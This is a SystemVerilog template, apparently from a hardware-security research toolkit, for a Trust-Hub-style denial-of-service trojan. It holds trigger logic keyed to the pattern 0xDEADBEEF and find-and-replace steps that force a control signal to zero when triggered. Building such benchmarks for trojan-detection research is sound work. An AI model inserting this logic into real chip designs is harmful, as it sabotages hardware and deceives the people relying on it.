/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables control signals based on trigger condition
 *   
 * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
 * Payload: Force {{PAYLOAD_SIGNAL}} = 0
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Magic pattern that triggers the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan activates when trigger signal matches pattern
wire trojan_active;
assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Disable {{PAYLOAD_SIGNAL}} when pattern detected
//
// Integration Script Must Modify:
//
// IF {{PAYLOAD_SIGNAL}} is assigned:
//   Find: assign {{PAYLOAD_SIGNAL}} = value;
//   Replace: assign {{PAYLOAD_SIGNAL}} = trojan_active ? 1'b0 : value;
//
// IF {{PAYLOAD_SIGNAL}} is used in expression:
//   Find: some_output = {{PAYLOAD_SIGNAL}} & other_signal;
//   Replace: some_output = (trojan_active ? 1'b0 : {{PAYLOAD_SIGNAL}}) & other_signal;